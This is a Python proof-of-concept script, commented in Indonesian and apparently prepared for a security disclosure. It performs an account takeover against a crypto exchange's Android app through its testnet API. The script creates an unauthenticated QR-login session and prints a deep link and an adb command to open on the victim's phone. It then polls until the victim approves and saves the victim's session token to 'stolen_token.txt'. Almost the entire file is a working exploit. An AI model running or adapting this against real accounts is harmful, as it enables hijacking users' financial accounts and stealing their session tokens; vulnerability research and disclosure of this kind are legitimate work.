#!/usr/bin/env python3
"""
Draft E — Deep link -> QR-login approval ATO (BTSE Android, testnet)
Sisi PENYERANG: jalankan di PC. Tanpa dependensi (python3 stdlib).

Alur:
  1. Minta sessionId  -> POST /api/qr/session        (tanpa auth)
  2. Tampilkan link deeplink untuk dibuka di HP korban
  3. Poll              -> POST /api/qr/poll           (tanpa auth)
     - status PENDING  : menunggu
     - status SCANNED  : app korban sudah AUTO-CLAIM (buka link = klaim, tanpa aksi!)
     - status SUCCESS  : korban tap Approve -> TOKEN KORBAN TERBIT
  4. Cetak + simpan token (bukti ATO)

Pakai: python3 poc_deeplink_attacker.py
Masa berlaku sessionId ±180 detik — rekam segera setelah start.
"""
import base64
import json
import sys
import time
import uuid
import urllib.request
import urllib.error

BASE = "https://testapi.btse.io"


def raw(method, url, body=None, timeout=30):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        url, data=data, method=method, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return -1, str(e)


def banner(ch):
    print("\n" + "=" * 64)
    print(f"  {ch}")
    print("=" * 64)


def decode_jwt(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}


def main():
    banner("DRAFT E PoC — QR-LOGIN APPROVAL via DEEPLINK (BTSE testnet)")

    login_token = str(uuid.uuid4())
    st, body = raw("POST", f"{BASE}/api/qr/session", {"loginToken": login_token})
    print(f"[attacker] POST /api/qr/session -> {st}")
    if st != 200:
        print(body[:300]); sys.exit(1)
    sid = json.loads(body)["data"]
    print(f"[attacker] sessionId = {sid}")
    try:
        open("poc_sid.txt", "w").write(sid)  # koordinasi otomatis sisi demo
    except OSError:
        pass

    intent_link = (
        "intent://app.btse.com/app/session/authorize?sessionId="
        + sid
        + "#Intent;scheme=app;package=com.btse.finance;end"
    )
    alt_link = f"app://app.btse.com/app/session/authorize?sessionId={sid}"

    banner("BUKA LINK INI DI HP KORBAN (app BTSE testnet, login A1)")
    print(intent_link)
    print("\n(varian alternatif, dari browser/manapun):")
    print(alt_link)
    print("\n[Jika ada adb] perintah setara:")
    print(
        f'  adb shell am start -a android.intent.action.VIEW '
        f'-d "app://app.btse.com/app/session/authorize?sessionId={sid}" com.btse.finance'
    )
    print("\n>> Rekam layar HP + layar PC ini sekarang. TTL sessionId ±180 detik.")

    deadline = time.time() + 300
    last = None
    while time.time() < deadline:
        st, body = raw(
            "POST",
            f"{BASE}/api/qr/poll",
            {
                "loginToken": login_token,
                "sessionId": sid,
                "deviceFingerprint": "_pocfp",
            },
            timeout=25,
        )
        if st != 200:
            print(f"[poll] {st}: {body[:160]}")
            time.sleep(2)
            continue
        data = json.loads(body).get("data") or {}
        status = data.get("status")
        if status != last:
            t = time.strftime("%H:%M:%S")
            if status == "SCANNED":
                banner(f"[{t}] SCANNED — app korban AUTO-CLAIM (tanpa scan apa pun!)")
            elif status == "SUCCESS":
                banner(f"[{t}] SUCCESS — KORBAN TAP APPROVE -> TOKEN TERBIT")
            else:
                print(f"[{t}] status = {status}")
            last = status
        if status == "SUCCESS":
            tok = data.get("token")
            print(f"\n[ATO] username = {data.get('username')}  webIdentifier = {data.get('webIdentifier')}")
            print(f"[ATO] token  = {tok}")
            print(f"[ATO] claims = {json.dumps(decode_jwt(tok))}")
            open("stolen_token.txt", "w").write(tok or "")
            print("[ATO] disimpan -> stolen_token.txt")
            banner("POC SELESAI — token akun korban berada di kanal penyerang")
            return
        time.sleep(2)

    banner("TIMEOUT (5 menit) — jalankan ulang untuk sessionId baru")


if __name__ == "__main__":
    main()
